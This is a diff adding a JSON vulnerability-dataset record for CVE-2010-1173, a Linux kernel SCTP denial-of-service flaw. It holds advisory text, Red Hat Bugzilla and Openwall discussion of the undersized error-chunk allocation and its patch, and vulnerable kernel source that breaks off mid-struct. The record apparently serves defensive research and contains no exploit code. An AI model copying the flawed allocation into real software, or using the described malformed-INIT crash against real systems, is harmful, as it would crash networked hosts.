@@ -1,0 +1,2628 @@
+{
+  "CVE-2010-1173": {
+    "CVE_intrinsic_attributes": {
+      "Vulnerability Description": {
+        "nvd": "The sctp_process_unk_param function in net/sctp/sm_make_chunk.c in the Linux kernel 2.6.33.3 and earlier, when SCTP is enabled, allows remote attackers to cause a denial of service (system crash) via an SCTPChunkInit packet containing multiple invalid parameters that require a large amount of error data.",
+        "redhat": "DescriptionThe CVE Program describes this issue as:The sctp_process_unk_param function in net/sctp/sm_make_chunk.c in the Linux kernel 2.6.33.3 and earlier, when SCTP is enabled, allows remote attackers to cause a denial of service (system crash) via an SCTPChunkInit packet containing multiple invalid parameters that require a large amount of error data."
+      },
+      "CWE": {
+        "CWE_ID": [
+          {
+            "CWE ID": 20,
+            "Weakness Type": "Improper Input Validation"
+          }
+        ]
+      },
+      "Developer Discussions": {
+        "redhat-bugzilla": [
+          {
+            "bug_id": "https://bugzilla.redhat.com/show_bug.cgi?id=584645",
+            "source": "redhat",
+            "type": "bugzilla",
+            "comments": [
+              {
+                "comment_id": "c0",
+                "comment_content": "Description of problem: Reported by Nokia-CN-Flexi via Issue Tracker. A similar issue was reported by Jukka Taimisto and Olli Jarva from the CROSS open source testing project at Codenomicon Ltd. This was also reported by Windriver on behalf of their customer via vendor-sec. Kernel crash occurs if sctp listening port receives malformatted init packet. Its an skb_over_panic BUG halt that results from processing an init chunk in which too many of its variable length parameters are in some way malformed. The problem is in sctp_process_unk_param: if (NULL == *errp) *errp = sctp_make_op_error_space(asoc, chunk, ntohs(chunk->chunk_hdr->length)); if (*errp) { sctp_init_cause(*errp, SCTP_ERROR_UNKNOWN_PARAM, WORD_ROUND(ntohs(param.p->length))); sctp_addto_chunk(*errp, WORD_ROUND(ntohs(param.p->length)), param.v); When we allocate an error chunk, we assume that the worst case scenario requires that we have chunk_hdr->length data allocated, which would be correct nominally, given that we call sctp_addto_chunk for the violating parameter. Unfortunately, we also, in sctp_init_cause insert a sctp_errhdr_t structure into the error chunk, so the worst case situation in which all parameters are in violation requires chunk_hdr->length+(sizeof(sctp_errhdr_t)*param_count) bytes of data. This fix solves the problem by allowing our implementation to only report a fixed number of errors. When we encounter an error in parameter processing we allocate a chunk that is min(asoc->pathmtu, SCTP_DEFAULT_MAXSEGMENT), limiting our error reporting to a single mtu sized chunk. Parameter errors that grow beyond that value are discarded.",
+                "comment_author": "Eugene Teo (Security Response)",
+                "comment_date": "2010-04-22 05:39:14 UTC"
+              },
+              {
+                "comment_id": "c18",
+                "comment_content": "Created attachment 409211 [details] patch to pre-allocate error chunk w/ proper space Heres the patch I've written. It pre-allocates the error chunk assuming worst case conditions, which is that each parameter will be in error (requiring its own sctp errror header).",
+                "comment_author": "Neil Horman",
+                "comment_date": "2010-04-26 15:30:18 UTC"
+              },
+              {
+                "comment_id": "c20",
+                "comment_content": "*** Bug 586631 has been marked as a duplicate of this bug. ***",
+                "comment_author": "Eugene Teo (Security Response)",
+                "comment_date": "2010-04-28 06:02:29 UTC"
+              },
+              {
+                "comment_id": "c23",
+                "comment_content": "Consider this public. http://article.gmane.org/gmane.linux.network/159531",
+                "comment_author": "Eugene Teo (Security Response)",
+                "comment_date": "2010-04-29 00:46:40 UTC"
+              },
+              {
+                "comment_id": "c24",
+                "comment_content": "Kbase: http://kbase.redhat.com/faq/docs/DOC-31052",
+                "comment_author": "Eugene Teo (Security Response)",
+                "comment_date": "2010-04-30 05:20:21 UTC"
+              },
+              {
+                "comment_id": "c25",
+                "comment_content": "For completeness: The patch that was committed to the upstream networking git: http://git.kernel.org/?p=linux/kernel/git/davem/net-2.6.git;a=commitdiff;h=5fa782c2f5ef6c2e4f04d3e228412c9b4a4c8809 It has been merged into the vanilla kernel git: http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=032b734d291e3532221b6cf7643a5f41c6261941",
+                "comment_author": "J.H.M. Dassen (Ray)",
+                "comment_date": "2010-04-30 09:12:32 UTC"
+              },
+              {
+                "comment_id": "c26",
+                "comment_content": "(In reply to comment #25 ) > For completeness: > > The patch that was committed to the upstream networking git: > > http://git.kernel.org/?p=linux/kernel/git/davem/net-2.6.git;a=commitdiff;h=5fa782c2f5ef6c2e4f04d3e228412c9b4a4c8809 > It has been merged into the vanilla kernel git: > > http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=032b734d291e3532221b6cf7643a5f41c6261941 ^^ AFAICS, it's not fixed in upstream yet.",
+                "comment_author": "Eugene Teo (Security Response)",
+                "comment_date": "2010-05-04 01:40:46 UTC"
+              },
+              {
+                "comment_id": "c27",
+                "comment_content": "What are you talking about, eugene? I sent the patch up, & it went into net-2.6. you were copied on the mail, and have the commit above.",
+                "comment_author": "Neil Horman",
+                "comment_date": "2010-05-05 00:28:33 UTC"
+              },
+              {
+                "comment_id": "c28",
+                "comment_content": "(In reply to comment #27 ) > What are you talking about, eugene? I sent the patch up, & it went into > net-2.6. you were copied on the mail, and have the commit above. but not into linux-2.6 yet. But I guess it will be committed there eventually.",
+                "comment_author": "Eugene Teo (Security Response)",
+                "comment_date": "2010-05-05 01:34:37 UTC"
+              },
+              {
+                "comment_id": "c29",
+                "comment_content": "(In reply to comment #28 ) > (In reply to comment #27 ) > > What are you talking about, eugene? I sent the patch up, & it went into > > net-2.6. you were copied on the mail, and have the commit above. > > but not into linux-2.6 yet. But I guess it will be committed there eventually. It is now. Upstream commit: http://git.kernel.org/linus/5fa782c2f5ef6c2e4f04d3e228412c9b4a4c8809",
+                "comment_author": "Eugene Teo (Security Response)",
+                "comment_date": "2010-05-09 09:18:25 UTC"
+              },
+              {
+                "comment_id": "c30",
+                "comment_content": "We will need this patch too: http://marc.info/?l=linux-sctp&m=127372809930656&w=2 commit 5fa782c2f5ef6c2e4f04d3e228412c9b4a4c8809 sctp: Fix skb_over_panic resulting from multiple invalid \\ parameter errors ( CVE-2010-1173 ) (v4) cause 'error cause' never be add the the ERROR chunk due to some typo when check valid length in sctp_init_cause_fixed().",
+                "comment_author": "Eugene Teo (Security Response)",
+                "comment_date": "2010-05-13 08:06:41 UTC"
+              },
+              {
+                "comment_id": "c32",
+                "comment_content": "Statement: Red Hat is aware of this issue and is tracking it via the following bug: https://bugzilla.redhat.com/CVE-2010-1173 . This issue did not affect the version of Linux kernel as shipped with Red Hat Enterprise Linux 3 as it did not include support for SCTP. Future kernel updates in Red Hat Enterprise Linux 4, 5 and Red Hat Enterprise MRG may address this flaw. For more information, please see http://kbase.redhat.com/faq/docs/DOC-31052 .",
+                "comment_author": "Eugene Teo (Security Response)",
+                "comment_date": "2010-05-19 16:34:21 UTC"
+              },
+              {
+                "comment_id": "c36",
+                "comment_content": "This issue has been addressed in following products: Red Hat Enterprise Linux 4 Via RHSA-2010:0474 https://rhn.redhat.com/errata/RHSA-2010-0474.html",
+                "comment_author": "errata-xmlrpc",
+                "comment_date": "2010-06-15 23:53:57 UTC"
+              },
+              {
+                "comment_id": "c37",
+                "comment_content": "This issue has been addressed in following products: Red Hat Enterprise Linux 5 Via RHSA-2010:0504 https://rhn.redhat.com/errata/RHSA-2010-0504.html",
+                "comment_author": "errata-xmlrpc",
+                "comment_date": "2010-07-01 18:27:32 UTC"
+              },
+              {
+                "comment_id": "c40",
+                "comment_content": "The fix is in upstream release kernels 2.6.34, 2.6.33.6 and 2.6.32.16",
+                "comment_author": "Chuck Ebbert",
+                "comment_date": "2010-08-01 23:16:36 UTC"
+              },
+              {
+                "comment_id": "c42",
+                "comment_content": "This issue has been addressed in following products: MRG for RHEL-5 Via RHSA-2010:0631 https://rhn.redhat.com/errata/RHSA-2010-0631.html",
+                "comment_author": "errata-xmlrpc",
+                "comment_date": "2010-08-17 15:52:36 UTC"
+              },
+              {
+                "comment_id": "c43",
+                "comment_content": "This issue has been addressed in mrg1-3",
+                "comment_author": "John Kacur",
+                "comment_date": "2010-09-06 12:53:48 UTC"
+              }
+            ]
+          }
+        ],
+        "Openwall": [
+          "On 04/29/2010 10:58 AM, Hui Zhu wrote:\n> Eugene Teo:\n>> \nhttps://bugzilla.redhat.com/CVE-2010-1173\n\n>> \nhttp://article.gmane.org/gmane.linux.network/159531\n\n>>\n>> Reported by Chris Guo from Nokia China via Red Hat Support. A similar\n>> issue was reported by Jukka Taimisto and Olli Jarva from Codenomicon Ltd\n>> via CERT-FI. This was also reported by Windriver on behalf of their\n>> customer via vendor-sec.\n>>\n>> Kernel crash occurs if sctp listening port receives malformatted init\n>> package.\n>>\n>> Its an skb_over_panic BUG halt that results from processing an init\n>> chunk in which too many of its variable length parameters are in some\n>> way malformed.\n>>\n>> The problem is in sctp_process_unk_param:\n>> if (NULL == *errp)\n>>   *errp = sctp_make_op_error_space(asoc, chunk,\n>>        ntohs(chunk->chunk_hdr->length));\n>>\n>>   if (*errp) {\n>>    sctp_init_cause(*errp, SCTP_ERROR_UNKNOWN_PARAM,\n>>       WORD_ROUND(ntohs(param.p->length)));\n>>    sctp_addto_chunk(*errp,\n>>     WORD_ROUND(ntohs(param.p->length)),\n>>        param.v);\n>>\n>> When we allocate an error chunk, we assume that the worst case scenario\n>> requires that we have chunk_hdr->length data allocated, which would be\n>> correct nominally, given that we call sctp_addto_chunk for the violating\n>> parameter. Unfortunately, we also, in sctp_init_cause insert a\n>> sctp_errhdr_t structure into the error chunk, so the worst case\n>> situation in which all parameters are in violation requires\n>> chunk_hdr->length+(sizeof(sctp_errhdr_t)*param_count) bytes of data.\n>>\n>> This fix solves the problem by allowing our implementation to only\n>> report a fixed number of errors.  When we encounter an error in\n>> parameter processing we allocate a chunk that is min(asoc->pathmtu,\n>> SCTP_DEFAULT_MAXSEGMENT), limiting our error reporting to a single mtu\n>> sized chunk.  Parameter errors that grow beyond that value are discarded.\n>>\n>> Thanks, Eugene\n>>\n>\n> Forward a mail of my workmate:\n>\n> Make a larger chunk is acceptable but for common communication case, the original one is fine enough. And I don't think it is necessary to make such a big chunk. In fact, in worst case, a *double* sized chunk is large enough to hold all necessary data. So, if we have to use the larger chunk than original, we shoudl use min(double of chunk hdr length, asoc->pathmtu, SCTP_DEFAULT_MAXSEGMENT).\n>\n> For other part of that patch, I think:\n> -) A logical issue related to function \"sctp_init_cause_fixed\". Even if it finds the space is not enough and return \"-ENOSPC\", \"sctp_addto_chunk_fixed\" will still be spawned to add error param data in the error report chunk.\n>\n> -) As I understand, every error report should has two part: head and data. So if the chunk doesn't have enough space to hold it, both of them should be discarded. So in WINDRIVER patch that ZhuHui released out, there are only one space check for the whole error report sapce: head + data. But with this patch, it may just report the error data without head.\n>\n> -) No use to check the \"skb_tailroom\" serially, for example in call trace \"sctp_init_cause_fixed ->  sctp_addto_chunk_fixed\". Here it just use the original actp_add_chunk is OK.\n>\n> -) Make function \"sctp_init_cause_fixed\", \"sctp_addto_chunk_fixed\" static inline;\n\nHi Hui,\n\nAs I already mentioned, discussion of the patch should take place in \nnetdev. You might want to consider CC'ing security@...nel.org too. For a \nstart, this is not the right list for such a discussion. I don't even \nsee the maintainer for SCTP cc'ed to the email too. To make it easier \nfor you, feel free to follow-up from here: \n\nhttp://article.gmane.org/gmane.linux.network/159531\n.\n\nThanks, Eugene",
+          "\nhttps://bugzilla.redhat.com/CVE-2010-1173\n\n\nhttp://article.gmane.org/gmane.linux.network/159531\n\n\nReported by Chris Guo from Nokia China via Red Hat Support. A similar \nissue was reported by Jukka Taimisto and Olli Jarva from Codenomicon Ltd \nvia CERT-FI. This was also reported by Windriver on behalf of their \ncustomer via vendor-sec.\n\nKernel crash occurs if sctp listening port receives malformatted init \npackage.\n\nIts an skb_over_panic BUG halt that results from processing an init \nchunk in which too many of its variable length parameters are in some \nway malformed.\n\nThe problem is in sctp_process_unk_param:\nif (NULL == *errp)\n  *errp = sctp_make_op_error_space(asoc, chunk,\n       ntohs(chunk->chunk_hdr->length));\n\n  if (*errp) {\n   sctp_init_cause(*errp, SCTP_ERROR_UNKNOWN_PARAM,\n      WORD_ROUND(ntohs(param.p->length)));\n   sctp_addto_chunk(*errp,\n    WORD_ROUND(ntohs(param.p->length)),\n       param.v);\n\nWhen we allocate an error chunk, we assume that the worst case scenario\nrequires that we have chunk_hdr->length data allocated, which would be \ncorrect nominally, given that we call sctp_addto_chunk for the violating \nparameter. Unfortunately, we also, in sctp_init_cause insert a \nsctp_errhdr_t structure into the error chunk, so the worst case \nsituation in which all parameters are in violation requires \nchunk_hdr->length+(sizeof(sctp_errhdr_t)*param_count) bytes of data.\n\nThis fix solves the problem by allowing our implementation to only \nreport a fixed number of errors.  When we encounter an error in \nparameter processing we allocate a chunk that is min(asoc->pathmtu, \nSCTP_DEFAULT_MAXSEGMENT), limiting our error reporting to a single mtu \nsized chunk.  Parameter errors that grow beyond that value are discarded.\n\nThanks, Eugene"
+        ]
+      },
+      "Vulnerable Location": {
+        "Vulnerable OS component": [
+          "structs.h",
+          "sctp_addto_chunk",
+          "sctp_init_cause",
+          "sctp_make_op_error_space",
+          "sctp_process_unk_param"
+        ],
+        "Vulnerable code block": [
+          {
+            "structs.h": "/* SCTP kernel implementation\n * (C) Copyright IBM Corp. 2001, 2004\n * Copyright (c) 1999-2000 Cisco, Inc.\n * Copyright (c) 1999-2001 Motorola, Inc.\n * Copyright (c) 2001 Intel Corp.\n *\n * This file is part of the SCTP kernel implementation\n *\n * This SCTP implementation is free software;\n * you can redistribute it and/or modify it under the terms of\n * the GNU General Public License as published by\n * the Free Software Foundation; either version 2, or (at your option)\n * any later version.\n *\n * This SCTP implementation is distributed in the hope that it\n * will be useful, but WITHOUT ANY WARRANTY; without even the implied\n *\t\t   ************************\n * warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n * See the GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with GNU CC; see the file COPYING.  If not, write to\n * the Free Software Foundation, 59 Temple Place - Suite 330,\n * Boston, MA 02111-1307, USA.\n *\n * Please send any bug reports or fixes you make to the\n * email addresses:\n *    lksctp developers <lksctp-developers@lists.sourceforge.net>\n *\n * Or submit a bug report through the following website:\n *    http://www.sf.net/projects/lksctp\n *\n * Written or modified by:\n *    Randall Stewart\t    <randall@sctp.chicago.il.us>\n *    Ken Morneau\t    <kmorneau@cisco.com>\n *    Qiaobing Xie\t    <qxie1@email.mot.com>\n *    La Monte H.P. Yarroll <piggy@acm.org>\n *    Karl Knutson\t    <karl@athena.chicago.il.us>\n *    Jon Grimm\t\t    <jgrimm@us.ibm.com>\n *    Xingang Guo\t    <xingang.guo@intel.com>\n *    Hui Huang\t\t    <hui.huang@nokia.com>\n *    Sridhar Samudrala\t    <sri@us.ibm.com>\n *    Daisy Chang\t    <daisyc@us.ibm.com>\n *    Dajiang Zhang\t    <dajiang.zhang@nokia.com>\n *    Ardelle Fan\t    <ardelle.fan@intel.com>\n *    Ryan Layer\t    <rmlayer@us.ibm.com>\n *    Anup Pemmaiah\t    <pemmaiah@cc.usu.edu>\n *    Kevin Gao             <kevin.gao@intel.com>\n *\n * Any bugs reported given to us we will try to fix... any fixes shared will\n * be incorporated into the next SCTP release.\n */\n\n#ifndef __sctp_structs_h__\n#define __sctp_structs_h__\n\n#include <linux/time.h>\t\t/* We get struct timespec.    */\n#include <linux/socket.h>\t/* linux/in.h needs this!!    */\n#include <linux/in.h>\t\t/* We get struct sockaddr_in. */\n#include <linux/in6.h>\t\t/* We get struct in6_addr     */\n#include <linux/ipv6.h>\n#include <asm/param.h>\t\t/* We get MAXHOSTNAMELEN.     */\n#include <asm/atomic.h>\t\t/* This gets us atomic counters.  */\n#include <linux/skbuff.h>\t/* We need sk_buff_head. */\n#include <linux/workqueue.h>\t/* We need tq_struct.\t */\n#include <linux/sctp.h>\t\t/* We need sctp* header structs.  */\n#include <net/sctp/auth.h>\t/* We need auth specific structs */\n\n/* A convenience structure for handling sockaddr structures.\n * We should wean ourselves off this.\n */\nunion sctp_addr {\n\tstruct sockaddr_in v4;\n\tstruct sockaddr_in6 v6;\n\tstruct sockaddr sa;\n};\n\n/* Forward declarations for data structures. */\nstruct sctp_globals;\nstruct sctp_endpoint;\nstruct sctp_association;\nstruct sctp_transport;\nstruct sctp_packet;\nstruct sctp_chunk;\nstruct sctp_inq;\nstruct sctp_outq;\nstruct sctp_bind_addr;\nstruct sctp_ulpq;\nstruct sctp_ep_common;\nstruct sctp_ssnmap;\nstruct crypto_hash;\n\n\n#include <net/sctp/tsnmap.h>\n#include <net/sctp/ulpevent.h>\n#include <net/sctp/ulpqueue.h>\n\n/* Structures useful for managing bind/connect. */\n\nstruct sctp_bind_bucket {\n\tunsigned short\tport;\n\tunsigned short\tfastreuse;\n\tstruct hlist_node\tnode;\n\tstruct hlist_head\towner;\n};\n\nstruct sctp_bind_hashbucket {\n\tspinlock_t\tlock;\n\tstruct hlist_head\tchain;\n};\n\n/* Used for hashing all associations.  */\nstruct sctp_hashbucket {\n\trwlock_t\tlock;\n\tstruct hlist_head\tchain;\n} __attribute__((__aligned__(8)));\n\n\n/* The SCTP globals structure. */\nextern struct sctp_globals {\n\t/* RFC2960 Section 14. Suggested SCTP Protocol Parameter Values\n\t *\n\t * The following protocol parameters are RECOMMENDED:\n\t *\n\t * RTO.Initial\t\t    - 3\t seconds\n\t * RTO.Min\t\t    - 1\t second\n\t * RTO.Max\t\t   -  60 seconds\n\t * RTO.Alpha\t\t    - 1/8  (3 when converted to right shifts.)\n\t * RTO.Beta\t\t    - 1/4  (2 when converted to right shifts.)\n\t */\n\tunsigned int rto_initial;\n\tunsigned int rto_min;\n\tunsigned int rto_max;\n\n\t/* Note: rto_alpha and rto_beta are really defined as inverse\n\t * powers of two to facilitate integer operations.\n\t */\n\tint rto_alpha;\n\tint rto_beta;\n\n\t/* Max.Burst\t\t    - 4 */\n\tint max_burst;\n\n\t/* Whether Cookie Preservative is enabled(1) or not(0) */\n\tint cookie_preserve_enable;\n\n\t/* Valid.Cookie.Life\t    - 60  seconds  */\n\tunsigned int valid_cookie_life;\n\n\t/* Delayed SACK timeout  200ms default*/\n\tunsigned int sack_timeout;\n\n\t/* HB.interval\t\t    - 30 seconds  */\n\tunsigned int hb_interval;\n\n\t/* Association.Max.Retrans  - 10 attempts\n\t * Path.Max.Retrans\t    - 5\t attempts (per destination address)\n\t * Max.Init.Retransmits\t    - 8\t attempts\n\t */\n\tint max_retrans_association;\n\tint max_retrans_path;\n\tint max_retrans_init;\n\n\t/*\n\t * Policy for preforming sctp/socket accounting\n\t * 0   - do socket level accounting, all assocs share sk_sndbuf\n\t * 1   - do sctp accounting, each asoc may use sk_sndbuf bytes\n\t */\n\tint sndbuf_policy;\n\n\t/*\n\t * Policy for preforming sctp/socket accounting\n\t * 0   - do socket level accounting, all assocs share sk_rcvbuf\n\t * 1   - do sctp accounting, each asoc may use sk_rcvbuf bytes\n\t */\n\tint rcvbuf_policy;\n\n\t/* The following variables are implementation specific.\t */\n\n\t/* Default initialization values to be applied to new associations. */\n\t__u16 max_instreams;\n\t__u16 max_outstreams;\n\n\t/* This is a list of groups of functions for each address\n\t * family that we support.\n\t */\n\tstruct list_head address_families;\n\n\t/* This is the hash of all endpoints. */\n\tint ep_hashsize;\n\tstruct sctp_hashbucket *ep_hashtable;\n\n\t/* This is the hash of all associations. */\n\tint assoc_hashsize;\n\tstruct sctp_hashbucket *assoc_hashtable;\n\n\t/* This is the sctp port control hash.\t*/\n\tint port_hashsize;\n\tstruct sctp_bind_hashbucket *port_hashtable;\n\n\t/* This is the global local address list.\n\t * We actively maintain this complete list of addresses on\n\t * the system by catching address add/delete events.\n\t *\n\t * It is a list of sctp_sockaddr_entry.\n\t */\n\tstruct list_head local_addr_list;\n\n\t/* Lock that protects the local_addr_list writers */\n\tspinlock_t addr_list_lock;\n\t\n\t/* Flag to indicate if addip is enabled. */\n\tint addip_enable;\n\tint addip_noauth_enable;\n\n\t/* Flag to indicate if PR-SCTP is enabled. */\n\tint prsctp_enable;\n\n\t/* Flag to idicate if SCTP-AUTH is enabled */\n\tint auth_enable;\n\n\t/*\n\t * Policy to control SCTP IPv4 address scoping\n\t * 0   - Disable IPv4 address scoping\n\t * 1   - Enable IPv4 address scoping\n\t * 2   - Selectively allow only IPv4 private addresses\n\t * 3   - Selectively allow only IPv4 link local address\n\t */\n\tint ipv4_scope_policy;\n\n\t/* Flag to indicate whether computing and verifying checksum\n\t * is disabled. */\n        int checksum_disable;\n\n\t/* Threshold for rwnd update SACKS.  Receive buffer shifted this many\n\t * bits is an indicator of when to send and window update SACK.\n\t */\n\tint rwnd_update_shift;\n} sctp_globals;\n\n#define sctp_rto_initial\t\t(sctp_globals.rto_initial)\n#define sctp_rto_min\t\t\t(sctp_globals.rto_min)\n#define sctp_rto_max\t\t\t(sctp_globals.rto_max)\n#define sctp_rto_alpha\t\t\t(sctp_globals.rto_alpha)\n#define sctp_rto_beta\t\t\t(sctp_globals.rto_beta)\n#define sctp_max_burst\t\t\t(sctp_globals.max_burst)\n#define sctp_valid_cookie_life\t\t(sctp_globals.valid_cookie_life)\n#define sctp_cookie_preserve_enable\t(sctp_globals.cookie_preserve_enable)\n#define sctp_max_retrans_association\t(sctp_globals.max_retrans_association)\n#define sctp_sndbuf_policy\t \t(sctp_globals.sndbuf_policy)\n#define sctp_rcvbuf_policy\t \t(sctp_globals.rcvbuf_policy)\n#define sctp_max_retrans_path\t\t(sctp_globals.max_retrans_path)\n#define sctp_max_retrans_init\t\t(sctp_globals.max_retrans_init)\n#define sctp_sack_timeout\t\t(sctp_globals.sack_timeout)\n#define sctp_hb_interval\t\t(sctp_globals.hb_interval)\n#define sctp_max_instreams\t\t(sctp_globals.max_instreams)\n#define sctp_max_outstreams\t\t(sctp_globals.max_outstreams)\n#define sctp_address_families\t\t(sctp_globals.address_families)\n#define sctp_ep_hashsize\t\t(sctp_globals.ep_hashsize)\n#define sctp_ep_hashtable\t\t(sctp_globals.ep_hashtable)\n#define sctp_assoc_hashsize\t\t(sctp_globals.assoc_hashsize)\n#define sctp_assoc_hashtable\t\t(sctp_globals.assoc_hashtable)\n#define sctp_port_hashsize\t\t(sctp_globals.port_hashsize)\n#define sctp_port_rover\t\t\t(sctp_globals.port_rover)\n#define sctp_port_alloc_lock\t\t(sctp_globals.port_alloc_lock)\n#define sctp_port_hashtable\t\t(sctp_globals.port_hashtable)\n#define sctp_local_addr_list\t\t(sctp_globals.local_addr_list)\n#define sctp_local_addr_lock\t\t(sctp_globals.addr_list_lock)\n#define sctp_scope_policy\t\t(sctp_globals.ipv4_scope_policy)\n#define sctp_addip_enable\t\t(sctp_globals.addip_enable)\n#define sctp_addip_noauth\t\t(sctp_globals.addip_noauth_enable)\n#define sctp_prsctp_enable\t\t(sctp_globals.prsctp_enable)\n#define sctp_auth_enable\t\t(sctp_globals.auth_enable)\n#define sctp_checksum_disable\t\t(sctp_globals.checksum_disable)\n#define sctp_rwnd_upd_shift\t\t(sctp_globals.rwnd_update_shift)\n\n/* SCTP Socket type: UDP or TCP style. */\ntypedef enum {\n\tSCTP_SOCKET_UDP = 0,\n\tSCTP_SOCKET_UDP_HIGH_BANDWIDTH,\n\tSCTP_SOCKET_TCP\n} sctp_socket_type_t;\n\n/* Per socket SCTP information. */\nstruct sctp_sock {\n\t/* inet_sock has to be the first member of sctp_sock */\n\tstruct inet_sock inet;\n\t/* What kind of a socket is this? */\n\tsctp_socket_type_t type;\n\n\t/* PF_ family specific functions.  */\n\tstruct sctp_pf *pf;\n\n\t/* Access to HMAC transform. */\n\tstruct crypto_hash *hmac;\n\n\t/* What is our base endpointer? */\n\tstruct sctp_endpoint *ep;\n\n\tstruct sctp_bind_bucket *bind_hash;\n\t/* Various Socket Options.  */\n\t__u16 default_stream;\n\t__u32 default_ppid;\n\t__u16 default_flags;\n\t__u32 default_context;\n\t__u32 default_timetolive;\n\t__u32 default_rcv_context;\n\tint max_burst;\n\n\t/* Heartbeat interval: The endpoint sends out a Heartbeat chunk to\n\t * the destination address every heartbeat interval. This value\n\t * will be inherited by all new associations.\n\t */\n\t__u32 hbinterval;\n\n\t/* This is the max_retrans value for new associations. */\n\t__u16 pathmaxrxt;\n\n\t/* The initial Path MTU to use for new associations. */\n\t__u32 pathmtu;\n\n\t/* The default SACK delay timeout for new associations. */\n\t__u32 sackdelay;\n\t__u32 sackfreq;\n\n\t/* Flags controlling Heartbeat, SACK delay, and Path MTU Discovery. */\n\t__u32 param_flags;\n\n\tstruct sctp_initmsg initmsg;\n\tstruct sctp_rtoinfo rtoinfo;\n\tstruct sctp_paddrparams paddrparam;\n\tstruct sctp_event_subscribe subscribe;\n\tstruct sctp_assocparams assocparams;\n\tint user_frag;\n\t__u32 autoclose;\n\t__u8 nodelay;\n\t__u8 disable_fragments;\n\t__u8 v4mapped;\n\t__u8 frag_interleave;\n\t__u32 adaptation_ind;\n\t__u32 pd_point;\n\n\tatomic_t pd_mode;\n\t/* Receive to here while partial delivery is in effect. */\n\tstruct sk_buff_head pd_lobby;\n};\n\nstatic inline struct sctp_sock *sctp_sk(const struct sock *sk)\n{\n       return (struct sctp_sock *)sk;\n}\n\nstatic inline struct sock *sctp_opt2sk(const struct sctp_sock *sp)\n{\n       return (struct sock *)sp;\n}\n\n#if defined(CONFIG_IPV6) || defined(CONFIG_IPV6_MODULE)\nstruct sctp6_sock {\n       struct sctp_sock  sctp;\n       struct ipv6_pinfo inet6;\n};\n#endif /* CONFIG_IPV6 */\n\n\n/* This is our APPLICATION-SPECIFIC state cookie.\n * THIS IS NOT DICTATED BY THE SPECIFICATION.\n */\n/* These are the parts of an association which we send in the cookie.\n * Most of these are straight out of:\n * RFC2960 12.2 Parameters necessary per association (i.e. the TCB)\n *\n */\n\nstruct sctp_cookie {\n\n\t/* My\t       : Tag expected in every inbound packet and sent\n\t * Verification: in the INIT or INIT ACK chunk.\n\t * Tag\t       :\n\t */\n\t__u32 my_vtag;\n\n\t/* Peer's      : Tag expected in every outbound packet except\n\t * Verification: in the INIT chunk.\n\t * Tag\t       :\n\t */\n\t__u32 peer_vtag;\n\n\t/* The rest of these are not from the spec, but really need to\n\t * be in the cookie.\n\t */\n\n\t/* My Tie Tag  : Assist in discovering a restarting association. */\n\t__u32 my_ttag;\n\n\t/* Peer's Tie Tag: Assist in discovering a restarting association. */\n\t__u32 peer_ttag;\n\n\t/* When does this cookie expire? */\n\tstruct timeval expiration;\n\n\t/* Number of inbound/outbound streams which are set\n\t * and negotiated during the INIT process.\n\t */\n\t__u16 sinit_num_ostreams;\n\t__u16 sinit_max_instreams;\n\n\t/* This is the first sequence number I used.  */\n\t__u32 initial_tsn;\n\n\t/* This holds the originating address of the INIT packet.  */\n\tunion sctp_addr peer_addr;\n\n\t/* IG Section 2.35.3 \n\t * Include the source port of the INIT-ACK\n\t */\n\t__u16\t\tmy_port;\n\n\t__u8 prsctp_capable;\n\n\t/* Padding for future use */\n\t__u8 padding;  \t\t\n\n\t__u32 adaptation_ind;\n\n\t__u8 auth_random[sizeof(sctp_paramhdr_t) + SCTP_AUTH_RANDOM_LENGTH];\n\t__u8 auth_hmacs[SCTP_AUTH_NUM_HMACS + 2];\n\t__u8 auth_chunks[sizeof(sctp_paramhdr_t) + SCTP_AUTH_MAX_CHUNKS];\n\n\t/* This is a shim for my peer's INIT packet, followed by\n\t * a copy of the raw address list of the association.\n\t * The length of the raw address list is saved in the\n\t * raw_addr_list_len field, which will be used at the time when\n\t * the association TCB is re-constructed from the cookie.\n\t */\n\t__u32 raw_addr_list_len;\n\tstruct sctp_init_chunk peer_init[0];\n};\n\n\n/* The format of our cookie that we send to our peer. */\nstruct sctp_signed_cookie {\n\t__u8 signature[SCTP_SECRET_SIZE];\n\t__u32 __pad;\t\t/* force sctp_cookie alignment to 64 bits */\n\tstruct sctp_cookie c;\n} __attribute__((packed));\n\n/* This is another convenience type to allocate memory for address\n * params for the maximum size and pass such structures around\n * internally.\n */\nunion sctp_addr_param {\n\tstruct sctp_paramhdr p;\n\tstruct sctp_ipv4addr_param v4;\n\tstruct sctp_ipv6addr_param v6;\n};\n\n/* A convenience type to allow walking through the various\n * parameters and avoid casting all over the place.\n */\nunion sctp_params {\n\tvoid *v;\n\tstruct sctp_paramhdr *p;\n\tstruct sctp_cookie_preserve_param *life;\n\tstruct sctp_hostname_param *dns;\n\tstruct sctp_cookie_param *cookie;\n\tstruct sctp_supported_addrs_param *sat;\n\tstruct sctp_ipv4addr_param *v4;\n\tstruct sctp_ipv6addr_param *v6;\n\tunion sctp_addr_param *addr;\n\tstruct sctp_adaptation_ind_param *aind;\n\tstruct sctp_supported_ext_param *ext;\n\tstruct sctp_random_param *random;\n\tstruct sctp_chunks_param *chunks;\n\tstruct sctp_hmac_algo_param *hmac_algo;\n\tstruct sctp_addip_param *addip;\n};\n\n/* RFC 2960.  Section 3.3.5 Heartbeat.\n *    Heartbeat Information: variable length\n *    The Sender-specific Heartbeat Info field should normally include\n *    information about the sender's current time when this HEARTBEAT\n *    chunk is sent and the destination transport address to which this\n *    HEARTBEAT is sent (see Section 8.3).\n */\ntypedef struct sctp_sender_hb_info {\n\tstruct sctp_paramhdr param_hdr;\n\tunion sctp_addr daddr;\n\tunsigned long sent_at;\n\t__u64 hb_nonce;\n} __attribute__((packed)) sctp_sender_hb_info_t;\n\n/*\n *  RFC 2960 1.3.2 Sequenced Delivery within Streams\n *\n *  The term \"stream\" is used in SCTP to refer to a sequence of user\n *  messages that are to be delivered to the upper-layer protocol in\n *  order with respect to other messages within the same stream.  This is\n *  in contrast to its usage in TCP, where it refers to a sequence of\n *  bytes (in this document a byte is assumed to be eight bits).\n *  ...\n *\n *  This is the structure we use to track both our outbound and inbound\n *  SSN, or Stream Sequence Numbers.\n */\n\nstruct sctp_stream {\n\t__u16 *ssn;\n\tunsigned int 